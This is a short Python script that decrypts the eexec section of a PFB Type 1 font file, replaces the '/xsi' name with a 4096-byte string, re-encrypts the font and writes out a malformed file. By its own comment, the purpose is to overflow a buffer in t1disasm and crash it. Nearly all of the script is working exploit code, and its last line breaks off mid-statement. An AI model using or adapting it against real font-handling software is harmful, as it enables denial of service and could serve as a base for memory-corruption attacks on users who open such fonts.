# This script modifies the pfb file to be even more invalid, and #
# overflow a buffer in t1disasm, causing the latter to crash.  There's
# no real point to this-- it's just for fun.

import sys, re, struct
stuff = open(sys.argv[1], 'rb').read()
textpart, binarylength, binarypart = re.match('^(.*currentfile eexec[^\n]*\n\x80\x02)(....)(.*)$', stuff, re.S).groups()

binarylength, = struct.unpack('I', binarylength)

textpart2 = binarypart[binarylength:]
binarypart = binarypart[:binarylength]

def crypt(encrypted, r, decrypt):
    c1 = 52845
    c2 = 22719
    decrypted = ''
    for c in encrypted:
        c = ord(c)
        new_c = (c ^ (r >> 8)) & 0xff
        #print hex(c), hex(new_c)
        decrypted += chr(new_c)
        #print r
        r = (((c if decrypt else new_c) + r)*c1 + c2) & 0xffff
    return decrypted

decrypted = crypt(binarypart, 55665, True)

def reassemble():
    return textpart + struct.pack('I', len(decrypted)) + crypt(decrypted, 55665, False) + textpart2

assert reassemble() == stuff

#print repr(decrypted)

decrypted = decrypted.replace('/xsi', '/' + 'a'*4096)

open(sys.argv[2], 'wb').write(reassemble())
#binarypart = re.sub('
